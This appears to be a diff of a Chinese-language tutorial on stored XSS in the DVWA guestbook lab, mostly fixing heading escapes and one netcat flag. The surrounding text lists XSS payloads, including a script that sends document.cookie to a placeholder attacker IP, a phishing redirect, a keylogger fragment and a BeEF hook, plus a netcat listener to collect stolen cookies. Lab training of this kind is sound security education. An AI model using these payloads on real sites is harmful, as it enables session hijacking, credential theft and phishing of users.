@@ -59,7 +59,7 @@ while ($row = mysqli_fetch_assoc($result)) {
 
 ## 三、手工测试流程
 
-### 1\. 正常提交留言
+### 1. 正常提交留言
 
 在 Name 填入：
 
@@ -80,7 +80,7 @@ Name: test
 Message: hello world
 ```
 
-### 2\. 测试 HTML 注入
+### 2. 测试 HTML 注入
 
 Name 填 `test`，Message 填：
 
@@ -90,7 +90,7 @@ Name 填 `test`，Message 填：
 
 提交后页面中 `bold` 显示为加粗，说明 HTML 标签被正常解析。
 
-### 3\. 测试脚本执行
+### 3. 测试脚本执行
 
 Name 填 `test`，Message 填：
 
@@ -100,11 +100,11 @@ Name 填 `test`，Message 填：
 
 提交后页面立即弹窗，说明存储型 XSS 存在。
 
-### 4\. 验证持久化
+### 4. 验证持久化
 
 刷新页面或重新打开该模块，弹窗仍然会触发。说明脚本已经被写入数据库，每次访问都会执行。
 
-### 5\. 在 Name 字段注入
+### 5. 在 Name 字段注入
 
 Name 字段同样存在注入。提交：
 
@@ -137,31 +137,31 @@ Name 字段同样存在注入。提交：
 
 ## 五、常用 Payload 与利用方式
 
-### 1\. 基础弹窗
+### 1. 基础弹窗
 
 ```html
 <script>alert(1)</script>
 ```
 
-### 2\. 窃取 Cookie
+### 2. 窃取 Cookie
 
 ```html
 <script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
 ```
 
-### 3\. 图片事件触发
+### 3. 图片事件触发
 
 ```html
 <img src=x onerror=alert(document.cookie)>
 ```
 
-### 4\. 页面跳转 / 钓鱼
+### 4. 页面跳转 / 钓鱼
 
 ```html
 <script>window.location='http://攻击者IP/login.html';</script>
 ```
 
-### 5\. 键盘记录（Keylogger）
+### 5. 键盘记录（Keylogger）
 
 ```html
 <script>
@@ -171,7 +171,7 @@ document.onkeypress = function(e) {
 </script>
 ```
 
-### 6\. XSS 平台（BeEF 等）
+### 6. XSS 平台（BeEF 等）
 
 实际渗透中，通常使用 BeEF 等 XSS 平台进行深度利用。注入：
 
@@ -183,7 +183,7 @@ BeEF 会对被控浏览器执行多种模块，例如：获取 Cookie、截屏�
 
 ## 六、搭建接收端验证 Cookie 窃取
 
-### 1\. 使用 Python 搭建简易 HTTP 服务
+### 1. 使用 Python 搭建简易 HTTP 服务
 
 在攻击机执行：
 
@@ -194,10 +194,10 @@ python3 -m http.server 80
 或者用更灵活的 `nc`：
 
 ```bash
-nc -lvp 80
+nc -lvnp 80
 ```
 
-### 2\. 注入 Payload
+### 2. 注入 Payload
 
 在 DVWA 留言板提交：
 
@@ -205,7 +205,7 @@ nc -lvp 80
 <script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
 ```
 
-### 3\. 观察接收日志
+### 3. 观察接收日志
 
 当其他用户访问留言板时，攻击机终端会收到类似：
 
